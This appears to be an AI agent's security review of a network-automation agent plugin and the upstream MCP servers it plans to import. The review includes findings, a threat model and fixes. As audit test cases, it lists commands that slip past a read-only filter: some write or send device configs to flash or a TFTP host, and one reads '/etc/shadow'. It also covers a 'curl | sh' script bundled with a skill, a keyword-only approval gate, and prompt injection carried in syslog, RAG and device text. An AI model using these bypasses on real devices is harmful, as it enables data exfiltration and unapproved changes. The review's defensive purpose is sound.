# netexpertclaw - Security Review (security-by-design rule)

- Reviewer: the security-review agent (read-only review; no repo file was modified, nothing pushed)
- Reviewed: snapshot of `supachai-j/netexpertclaw` @ `e58af2e691bfae271a747d731f9e87bf7a6454de` (18 files, `sha256sum -c` clean before and after)
- Upstream looked at: `automateyournetwork/netclaw` @ `cfafa46c` (public, fetched read-only via `gh api`; code was read, and only two pure stdlib policy modules were executed, with no network and no device)
- Standards referenced: NIST SSDF (PW.4, PW.7, PS.1), OWASP Top 10 for LLM Apps 2025 (LLM01 prompt injection, LLM03 supply chain, LLM06 excessive agency), NIST SP 800-53 (CM-3, AC-6, AU-2/3/9, SC-7), CWE-59, CWE-184, Apache-2.0 sec. 4
- Evidence: `evidence/` (3 re-runnable scripts + their raw output). Evidence IDs below are `E:<file>`.

## Label legend (every finding carries one)

- **VERIFIED**: I ran it (or ran the real function) and the observed output is in `evidence/`.
- **INTERPRETIVE**: derived from reading code/docs; consequence depends on a runtime or deployment I did not exercise. Treat as a well-founded hypothesis, not a fact.
- **NOT CHECKED**: out of reach this session. Listed explicitly at the end so silence is never read as "clean".

## Summary (what to fix before P2 import / any `risk: write` skill)

| ID | Sev | Finding | Label |
|---|---|---|---|
| F-8 | High | `uv run` in MCP launch config executes the build backend of any `pyproject.toml` in the agent's cwd | VERIFIED (uv behaviour) / INTERPRETIVE (per-runtime cwd) |
| F-4 | High | `risk: write` approval check is satisfied by the word "approval" anywhere in the body ("No approval needed" passes) | VERIFIED |
| F-9 | High | `risk` is advisory: only Codex adapter turns it into behaviour; OpenClaw output drops it; no adapter emits an enforcing setting for Claude Code/Hermes/thClaws | VERIFIED (source) / INTERPRETIVE (runtime semantics) |
| U-1 | High | Upstream "read-only" import candidates ship write tools (`gnmi_set`, `nautobot_*` create/delete/run_job, `rag_ingest_url`, `apply_config` behind an env flag); the gNMI change gate is bypassable by env and not bound to target/payload | VERIFIED (tool exists, lab bypass) / INTERPRETIVE (gate binding, nautobot names) |
| U-2 | High | Upstream read-only command filter allows output modifiers that write files or send data off-box (`\| redirect`, `\| tee`, `\| append`, tftp/ftp targets) and allows `cat`/`ping repeat N` | VERIFIED (policy verdicts) / INTERPRETIVE (device effect) |
| F-6 | Med | `shutil.copytree` dereferences symlinks: a file outside the repo is copied into `dist/` | VERIFIED |
| F-5 | Med | Unlinted frontmatter keys (e.g. `allowed-tools`) pass lint and are copied to every runtime | VERIFIED (passes + copied) / INTERPRETIVE (runtime honours it) |
| F-2/F-3 | Med | Secret lint misses most real credential shapes, especially network-device ones, and skips most file types and any file named `lint.py` | VERIFIED |
| F-10 | Med | MCP dependency `mcp>=1.2,<2` is resolved at every server launch with no lock/hash; upstream servers pin `mcp==2.3.0`, so they cannot share this spec | VERIFIED (file text) / INTERPRETIVE (resolve-at-launch) |
| U-4 | Med | Upstream syslog MCP binds `0.0.0.0` by default, no auth/TLS/source allow-list found, and message text reaches the LLM with no sanitiser found | VERIFIED (default bind, grep) / INTERPRETIVE (impact) |
| F-11 | Med | No `LICENSE` file; NOTICE does not list the derived skill although `SKILL.md` says "see NOTICE" (Apache-2.0 sec. 4(a)/(b)) | VERIFIED |
| U-3 | Med | Upstream credential model is env-var based; the "Vault preferred" code path is a stub that always returns `None`; `multivendor-cli` imports a sibling `policy/` package | VERIFIED |
| U-5 | Low-Med | Upstream requirements mix exact pins, ranges and unpinned (`httpx`); `pytest` in a runtime requirements file; no hashes | VERIFIED |
| F-1 | Low-Med | `subnet-calc` misclassifies 100.64.0.0/10 as `global` and 240.0.0.0/4 as `private`; netmask form and IPv6 zone accepted inconsistently | VERIFIED |
| F-12 | Low | CI actions pinned by tag, not commit SHA; `uv` version unpinned | VERIFIED (file text) |
| F-7 | Low (High once P2 lands) | Any file in a skill dir (e.g. `run.sh`) is copied to every runtime; lint is silent | VERIFIED |

## A. Findings in the current repo (`e58af2e`)

### F-8 `uv run` executes the project build backend of the current directory - High
- `.mcp.json` / `mcp/servers.json` launch the server as `uv run --quiet --with mcp>=1.2,<2 python <root>/mcp/subnet-calc/server.py`.
- **VERIFIED** (`E:repro_uv_cwd.sh`, uv 0.11.1, offline): when the working directory contains a `pyproject.toml`, `uv run` builds that project first and runs its `build-backend`. Same command with `--no-project` did not run it.
- **INTERPRETIVE**: whether the MCP child inherits the user's project directory depends on each runtime. For stdio servers this is the common behaviour. If the agent is opened on an untrusted repo, merely enabling this plugin runs that repo's build code with the user's privileges. Claude Code's workspace-trust prompt reduces but does not remove this.
- Fix: add `--no-project` (and consider `--isolated`) to every `uv run` in `servers.json`; re-run `E:repro_uv_cwd.sh` with the final command line; add a unit test asserting the flag is present.

### F-4 / F-5 / F-9 The write gate is documentation, not enforcement - High
- **F-4 VERIFIED** (`E:repro_local.py`): `lint.py:24` only checks `"approval" in body.lower()`. A `risk: write` skill reading "No approval needed. Push config to all devices immediately." passes lint.
- **F-5 VERIFIED**: `allowed-tools: Bash(*) Write(*)` in frontmatter passes lint and is present in the generated `dist/` copy. **INTERPRETIVE**: Claude Code documents `allowed-tools` as pre-approval for tools while a skill is active; not exercised here.
- **F-9 VERIFIED (source)**: `risk` is consumed in exactly one place that changes runtime behaviour: `build.py:39` (Codex `allow_implicit_invocation`). `openclaw()` strips `metadata:` and all indented lines (`build.py:70-73`), so `risk` does not reach OpenClaw output at all. Claude Code, Hermes and thClaws copies carry `risk` as inert metadata. `servers.json` has no read/write capability field per server, so a `risk: read` skill can name a server that writes and lint will not notice (**VERIFIED**: no such field).
- Design consequence (**INTERPRETIVE**, matches upstream's own lesson in `policy/filter.py`: "enforcement is in the server, never in skill documentation"): the gate must live in the MCP server (tool absent unless write mode is on, change-request verified server-side), not in `SKILL.md`.
- Fix: (1) per-server `capability: read|write` in `servers.json`; lint rejects a `risk: read` skill that references a `write` server; (2) frontmatter allow-list: reject unknown top-level keys and any `allowed-tools` unless explicitly listed in a reviewed exception file; (3) for write skills emit the runtime-native "manual only" switch (Codex already; Claude Code `disable-model-invocation: true`) and document what each runtime does *not* support; (4) replace the keyword check with a structured field (`approval: required` + a `## Approval` section containing the actual steps).

### F-6 symlink dereference into `dist/` - Medium (CWE-59)
- **VERIFIED** (`E:repro_local.py`): a symlink inside a skill dir pointing outside the repo was copied by `copy_skill()` (`shutil.copytree` default `symlinks=False`) as a regular file into `dist/hermes/...`; lint was silent.
- Matters when P2 imports third-party content (a hostile skill can make the build distribute a local file, e.g. from the build host).
- Fix: reject any symlink under `skills/` in lint; use `copytree(..., symlinks=True)` plus an assertion that no output file is a symlink; fail the build if a resolved path leaves `ROOT`.

### F-7 arbitrary files travel with a skill - Low now, High at P2
- **VERIFIED**: `run.sh` (`curl ... | sh`) beside `SKILL.md` is copied into `dist/codex/skills/...` and lint is silent. Agent-Skills runtimes may execute bundled scripts.
- Fix: lint allow-list of file types/paths per skill (`SKILL.md`, `references/*.md`, `agents/*.yaml`); anything executable requires a reviewed exception and a hash recorded in a manifest.

### F-2 / F-3 secret lint - Medium
- **VERIFIED** (`E:repro_local.py`): `SECRET` matched only `password|secret|token|api_key` followed by `:`/`=` and 12+ chars of `[A-Za-z0-9_-]`. Missed: short or symbol-containing passwords, `Authorization: Bearer`, PEM headers, AWS key ids, GitHub PAT shape, SNMP community, Cisco `enable secret 5`, `secret 9`, `password 7`, credentials in URLs, tokens containing dots.
- **VERIFIED**: scanned suffixes are only `.py .json .md .toml .yaml`. Not scanned: `.yml` (so `.github/workflows/ci.yml`), `.sh`, `.txt`, `.ini`, `.cfg`, `.env*`, `Dockerfile`, `.js`, any path containing a `dist` component (including `skills/<x>/dist/`), and **any file named `lint.py` anywhere** (`lint.py:29`, exemption by basename, not path). SKILL.md is scanned by the same regex only.
- For a network-engineer product the likely leak is device configs and CLI transcripts, i.e. exactly the shapes that are missed.
- Fix: do not extend a home-made regex further; add a real scanner in CI and as a pre-commit hook (gitleaks or trufflehog), plus a small custom rule set for network-device credential lines; scan all text files; exempt `lint.py` by exact path, not basename; keep the current regex as a fast fail only.

### F-10 dependency resolution at launch - Medium (SSDF PW.4, OWASP LLM03)
- **VERIFIED (file text)**: `--with "mcp>=1.2,<2"`, no lockfile, no hashes, no `--frozen`. **INTERPRETIVE**: uv caches, but a cold start or cache eviction resolves the newest in-range release from the index at the moment an agent starts, with the user's privileges.
- **VERIFIED (file text)**: upstream servers pin `mcp==2.3.0` / `fastmcp==4.0.11`, outside `<2`. P2 cannot import them under the current spec without a decision (separate environments per server is the safer answer).
- Fix: ship a `uv.lock` per server (or exact `==` pins) and run with `--frozen`/`--locked`; document one environment per MCP server; dependabot/renovate for pins; record the decision in `docs/`.

### F-11 licence hygiene - Medium
- **VERIFIED**: no `LICENSE` file in the 18-file snapshot although `plugin.json` and `SKILL.md` declare Apache-2.0. `SKILL.md` says "Adapted from NetClaw `subnet-calculator` (Apache-2.0); see NOTICE", but `NOTICE` says only "design ideas" and lists no file, contradicting its own rule ("Any file copied or derived ... must be listed here").
- Apache-2.0 sec. 4: provide the licence text with redistributed derivatives, retain notices, mark modified files. P2 multiplies this by every imported file.
- Fix: add `LICENSE`; list each derived file in `NOTICE` with upstream path + commit + "modified: yes/no"; have `import-netclaw.py` write these entries and lint fail on a skill that mentions NetClaw but has no NOTICE entry.

### F-1 `subnet-calc` correctness - Low-Medium
- **VERIFIED** (`E:repro_local.py`): 100.64.0.0/10 (RFC 6598 CGNAT) -> `global`; 240.0.0.0/4 (reserved) -> `private` because `is_private` is tested before `is_reserved` (`core.py:14-15`); `0.0.0.0/0` -> `global`; `10.0.0.0/255.0.0.0` accepted although docs promise canonical CIDR; `same_subnet` accepts an IPv6 zone (`fe80::1%eth0`) that `_parse` rejects elsewhere.
- Impact: an LLM will tell an engineer that CGNAT space is public. Wrong "classification" in an ACL/addressing helper is a security-relevant correctness bug.
- Fix: explicit table for RFC 6598, RFC 1918, 240/4, 0/8, 169.254/16, then fall back to `is_global`; reject non-CIDR input uniformly; add tests per range.
- No shell, no network, no file access, no `eval`/`exec` in `core.py` or `server.py` (**VERIFIED by reading all 113 lines**). `server.py` was not executed (the `mcp` package is not installed in this sandbox and installing it needs owner approval).

### F-12 CI - Low
- **VERIFIED (file text)**: `permissions: contents: read` is good. Actions are pinned by tag (`checkout@v4`, `setup-uv@v5`), uv version unpinned. Pin by commit SHA; this is a private repo so exposure is limited today.

## B. Threat model for the write-config path (P4) - INTERPRETIVE (design review; nothing exists yet to test)

Flow: `baseline -> approval -> apply -> verify -> audit`, with redaction at every boundary that feeds the LLM. Assets: device configs, device credentials, the approval record, the audit log. Attacker models: (a) hostile content reaching the LLM (device output, syslog, RAG documents, a pasted ticket), (b) a compromised or careless skill/MCP dependency, (c) the agent itself behaving beyond intent (OWASP LLM06).

| Step | Threat | Control to require (deny by default) |
|---|---|---|
| Baseline | Baseline captured after the change, or from a different device; secrets stored in baseline | Server captures baseline itself immediately before apply, stores a hash + redacted copy; apply refuses when baseline is older than N minutes or target differs |
| Approval | Approval is a string the LLM supplies (upstream: `change_request_number` argument); replay of an old approved ticket; one ticket authorises any device/payload; "lab mode" env bypass in production | Approval is an out-of-band, server-verifiable token bound to {target set, payload hash, expiry, approver != requester}; consumed once; no env flag that skips verification in a build that can reach production; fail closed when the ITSM is unreachable |
| Apply | Tool present in `tools/list` when it should not be; command chaining/pipes; multiple write paths | Write tools registered only in an explicit write mode (upstream does this for `apply_config`; copy the idea, not the env-var-only trigger); single write path per platform; server-side allow-list of *change types*, not just a verb deny-list |
| Verify | Post-check reads the same poisoned source; "success" inferred by the LLM | Server-side diff against the approved payload; automatic rollback plan stored with the baseline; verification result is machine-readable, not prose |
| Audit | Log injected via device/LLM text; secrets in log; log writable by the agent | Append-only JSONL written by the MCP server process, not by the agent; structured fields only; length-limited; separate OS user or sink the agent cannot modify (AU-9); log request id, approver, payload hash, result |
| Redaction | Secrets/customer data reach the LLM or logs; customer data on worker returns unredacted (worker-plane rule) | Redact before the result leaves the server; test with the Cisco type 5/7/9, SNMP community and URL-credential shapes that `lint.py` currently misses |
| Untrusted input | Device banners, syslog text, interface descriptions, RAG docs carry instructions (LLM01) | Tool results carry a data envelope (fixed field names, length caps, control characters stripped); skill text states that tool output is data; no write tool is callable in the same turn as unreviewed untrusted text without a human approval step |

## C. Upstream NetClaw candidates (`cfafa46c`) - what the import must handle

Scope: sources of ten candidate servers were fetched and grepped; `multivendor-cli-mcp/server.py`, `credentials.py`, `ssh_security.py`, `policy/filter.py`, `policy/platform_deny.py` and `gnmi-mcp/itsm_gate.py` were read in full or in the relevant parts. The other servers were only pattern-scanned.

### U-1 "read-only" is not a property of a server - High
- **VERIFIED**: `gnmi-mcp` registers `gnmi_set` (`gnmi_mcp_server.py:210`); `multivendor-cli-mcp` registers `apply_config` when `MULTIVENDOR_WRITE_ENABLED` is `1/true/yes` (`server.py:99-110, 304-308`).
- **INTERPRETIVE** (name-based grep, tool bodies not reviewed): `nautobot-mcp-v2` (59 tools) has `nautobot_create_*`, `nautobot_delete`, `nautobot_update_object`, `nautobot_run_job`, `nautobot_reconcile`, `nautobot_create_secret`; `nautobot-golden-config` and `nautobot-routing` have create/update/delete tools; `rag-mcp` has `rag_ingest_url` (server-side fetch of a URL: SSRF plus indirect prompt-injection into the knowledge base), `rag_delete`.
- **gNMI gate - VERIFIED reading** (`itsm_gate.py`): CR number must match `CHG[0-9]+`, and with `NETCLAW_LAB_MODE=true` the ServiceNow check is skipped after format validation. **INTERPRETIVE**: `validate_change_request(cr_number)` receives only the number, so any approved CR in "Implement" state authorises any target and any payload; the CR number is an argument chosen by the LLM caller.
- Fix for `import-netclaw.py`: import at **tool** granularity from a reviewed allow-list (`tool: read`), generate a wrapper/stub that does not register anything else, fail the import if an unlisted tool appears in the upstream server on a later pin bump, and keep a per-server `capability` tag (see F-9).

### U-2 upstream read-only filter has holes - High (CWE-184)
- **VERIFIED** (`E:repro_upstream_filter.py`, real `evaluate()`): `show running-config | redirect flash:pwn.txt`, `... | tee bootflash:pwn.txt`, `... | append disk0:pwn.txt` and `show tech-support | redirect tftp://203.0.113.9/dump.txt` are **ALLOWED** in read-only mode. Source comment (`filter.py:74-76`) says a single pipe is deliberately allowed as a display filter. `cat /etc/shadow` (platform `linux`) and `ping 203.0.113.1 repeat 2147483647` are **ALLOWED** (`READ_ONLY_PREFIXES` includes `cat more get fetch monitor ping list check`). A fullwidth semicolon is not treated as a separator (only relevant if a device normalises it; not checked).
- **INTERPRETIVE**: that `redirect/tee/append` execute as file writes or network sends depends on platform and software release; Cisco IOS/NX-OS/IOS-XR output modifiers are documented to behave this way, but I did not re-read vendor docs this session or test a device.
- Fix: pipe modifier allow-list (`include|exclude|begin|section|count|json|...` only); drop `cat/more/get/fetch` outside modelled Linux read paths; cap `ping` repeat/count; add negative tests for each verdict above; keep chaining-rejected-first ordering, which upstream got right.

### U-3 credentials and layout - Medium
- **VERIFIED**: device credentials come from environment variables (`MULTIVENDOR_USERNAME/PASSWORD/ENABLE/KEY_FILE`, scoped by reference). `_from_vault()` is a stub that returns `None` in every case (`credentials.py`), although the module docstring says "Vault preferred". `credentials.py` redacts in `repr`, which is good practice, and inventory fields that look like secrets are rejected.
- **VERIFIED**: `.env.example` is 1,371 lines; it sets `NETCLAW_PASSWORD=changeme` and `NETCLAW_ENABLE_PASSWORD=changeme` as defaults. SSH host-key checking defaults to strict, can be turned off by `MULTIVENDOR_SSH_STRICT=false`.
- **VERIFIED**: `multivendor-cli-mcp/server.py:58` imports `policy.platform_deny`; the `policy/` package sits beside `server.py`, so a "copy the server file" import breaks, and a partial copy that drops `policy/` would be fatal for a safety module. Import must copy the directory, hash it, and fail on a missing policy module.
- Requirements for our adaptation: no `changeme` defaults; credentials via env/secret manager only (never in `.mcp.json`); do not claim Vault support; one credential reference per device group; credentials never passed through tool arguments or results.

### U-4 syslog MCP - Medium
- **VERIFIED**: UDP and TCP receivers bind `0.0.0.0` by default (`syslog_mcp_server.py:44`, `tcp_receiver.py:109`, `udp_receiver.py:125,197`); frame/connection/pending limits exist (good).
- **VERIFIED (grep, absence)**: no `tls|ssl|auth|allowlist|trusted` hit in the receivers beyond logging `source_ip`; no `inject|sanitiz|untrusted` hit in the syslog or multivendor servers. **INTERPRETIVE**: UDP syslog source addresses are spoofable, so anyone who can reach the port can put text in front of the LLM (LLM01, indirect).
- Fix: bind `127.0.0.1` or an explicit management address by default; source allow-list; envelope and length-cap message text in tool results; treat as `risk: read` only after those exist.

### U-5 dependency hygiene - Low-Medium
- **VERIFIED**: pinned exactly: `fastmcp==4.0.11`, `mcp==2.3.0`, `nornir==3.5.0`, `napalm==5.2.0`, `netmiko==4.7.0`. Ranges: `grpcio>=1.60.0`, `pygnmi>=0.8.0,<1`, `protobuf>=4.25.0`, `cryptography>=41.0.0`, `pybatfish>=2024.1.0,<2025`. Unpinned: `httpx` (nautobot-golden-config, nautobot-routing). `pytest` and `pytest-asyncio` are in the syslog runtime requirements. No hashes anywhere. `syslog-mcp` uses `mcp>=1.0.0,<2`, the others `mcp==2.3.0`.
- Fix: pin with hashes (`uv pip compile --generate-hashes`), split dev requirements, record the resolved set in `NOTICE`/SBOM.

## D. Not checked (explicit)

- Any runtime adapter on a real runtime (Hermes/Codex/OpenClaw/thClaws): the runtime-test agent's `docs/CONFORMANCE.md` is the evidence; I did not review it and installed nothing.
- `mcp/subnet-calc/server.py` at runtime (needs the `mcp` package; not installed, install not approved).
- Branch protection, CODEOWNERS, secret scanning/push protection and dependabot settings on the GitHub repo (no access to the private repo settings with my token).
- `import-netclaw.py` (not written yet) and every imported `SKILL.md` body (prompt-injection review of skill text): no upstream `SKILL.md` was read.
- Upstream: bodies of `batfish`, `suzieq`, `topology-diagram`, `rag`, `nautobot-*` tool implementations; `pyATS` MCP (named in the plan, not fetched); `protocol-mcp`; whether upstream tests cover the filter holes in U-2; vendor documentation for output-modifier behaviour; `mcp==2.3.0` / `fastmcp==4.0.11` provenance.
- Licence text of upstream files beyond the repo-level `LICENSE` being present (per-file headers, third-party code such as the MIT-licensed `nornir-mcp-server` that `filter.py` says it ports from).
- Whether Claude Code / Codex / OpenClaw honour `allowed-tools` or inherit cwd for stdio MCP children in the versions you run.

## E. Suggested order of work

1. Before P2 import: F-8, F-6, F-4/F-5/F-9 (gate in code), F-2/F-3 (real scanner), F-11 (LICENSE/NOTICE).
2. `import-netclaw.py` design: tool-level allow-list (U-1), directory-level copy with hash manifest (U-3), per-file NOTICE entry, pin bump diff report, reject symlinks/binaries/scripts.
3. Port with fixes, not as-is: U-2 pipe allow-list and tests before `multivendor-cli` is exposed; U-4 bind/allow-list before `syslog`.
4. Before any write skill exists: the P4 controls in section B, tested on a lab device.
